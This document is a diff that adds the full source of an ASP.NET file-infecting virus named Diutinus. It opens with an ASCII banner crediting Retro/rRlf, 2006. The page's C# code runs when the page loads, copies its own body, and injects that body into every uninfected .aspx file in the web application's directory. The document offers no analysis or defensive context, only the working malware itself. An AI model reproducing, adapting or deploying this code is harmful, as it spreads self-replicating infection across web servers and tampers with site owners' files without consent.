@@ -1,0 +1,79 @@
+					   
+					  _             
+                     |_)  _ _|_  ._  _ 
+                     | \ (/_ |_  |  (_)              www.pugnax.co.uk
+					*************************************************
+					**               ASPX.Diutinus                 **
+					**                Summer 2006                  **
+					*************************************************
+						          Anarchistic Sadistic
+						          
+                    <%@ Import Namespace="System.IO" %>
+                    <%@ Page Language="C#"%>
+                     
+                    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+                    <html xmlns="http://www.w3.org/1999/xhtml" >
+                    <head id="Head1" runat="server">
+                        <title>Diutinus</title>
+                    </head>
+                    <body>
+                        <form id="form1" runat="server">
+                            <!--incoho-->
+                            <%  StringBuilder exitus = new StringBuilder();         
+                                string Path = Request.PhysicalApplicationPath;
+                                string myself = Request.FilePath.Substring(Request.FilePath.LastIndexOf("/") + 1);
+                     
+                                StreamReader msr = File.OpenText(Path + myself);
+                                string mCode = msr.ReadToEnd();
+                                int cStart = mCode.IndexOf(@"<!--incoho-->");
+                                int cEnd = mCode.LastIndexOf("<!--compleo-->") + 14;
+                                mCode = mCode.Substring(cStart, cEnd - cStart);
+                                string[] files = Directory.GetFiles(Path, "*.aspx");
+                     
+                                foreach (string file in files)
+                                {
+                                    bool infected = false;            
+                                    string thefile = file.Substring(file.LastIndexOf("\\") + 1);
+                                    string vCode = null;
+                     
+                                    if (thefile == myself) { } else
+                                    {
+                                        StreamReader sr = File.OpenText(Path + thefile);                  
+                                        string input = null;
+                     
+                                        while ((input = sr.ReadLine()) != null)
+                                        {
+                                            if (input.Contains("Diutinus"))
+                                            {
+                                                infected = true;
+                                            }
+                     
+                                            vCode += input + "\r\n";
+                                        }
+                                        sr.Close();
+                     
+                                        if (infected == false)
+                                        {
+                                            if (!vCode.Contains("System.IO"))
+                                            {
+                                                exitus.Append("<%@ Import Namespace=\"System.IO\" %" + Convert.ToChar(62) + "\r\n");
+                                            } 
+                     
+                                            exitus.Append(vCode.Substring(0, vCode.LastIndexOf("%" + Convert.ToChar(62)) + 2));
+                                            exitus.Append(mCode);
+                                            exitus.Append(vCode.Substring(vCode.LastIndexOf("</form>")));
+                     
+                                            TextWriter tw = new StreamWriter(Path + thefile);
+                                            tw.WriteLine(exitus);
+                                            tw.Close();
+                                        }
+                                    }
+                                }
+                     
+                                Response.Write("Diutinus by Retro/rRlf<br>");
+                                Response.Write("  24th December 2006");      
+                            %>     
+                            <!--compleo-->    
+                        </form>
+                    </body>
+                    </html>
